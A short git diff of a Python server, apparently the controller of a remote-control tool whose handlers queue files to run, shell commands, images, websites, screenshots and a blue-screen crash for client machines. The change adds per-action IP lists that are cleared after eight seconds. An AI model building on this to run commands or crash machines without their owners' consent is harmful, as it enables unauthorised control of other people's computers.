@@ -200,12 +200,13 @@ def post_website() -> Response:
 
 
 def post_runfile_thread(data: bytes, args: str) -> None:
-    global runfile_args, runfile
+    global runfile_args, runfile_ips, runfile
     runfile = data
     runfile_args = args
     sleep(8)
     runfile = b""
     runfile_args = ""
+    runfile_ips = []
 
 
 def post_bsod_thread() -> None:
@@ -216,17 +217,19 @@ def post_bsod_thread() -> None:
 
 
 def post_command_thread(command_arg: str) -> None:
-    global command
+    global command_ips, command
     command = command_arg
     sleep(8)
     command = ""
+    command_ips = []
 
 
 def post_image_thread(data: bytes) -> None:
-    global image
+    global image_ips, image
     image = data
     sleep(8)
     image = b""
+    image_ips = []
 
 
 def post_screenshot_thread() -> None:
@@ -240,10 +243,11 @@ def post_screenshot_thread() -> None:
 
 
 def post_website_thread(website_arg: str) -> None:
-    global website
+    global website_ips, website
     website = website_arg
     sleep(8)
     website = ""
+    website_ips = []
 
 
 # Static
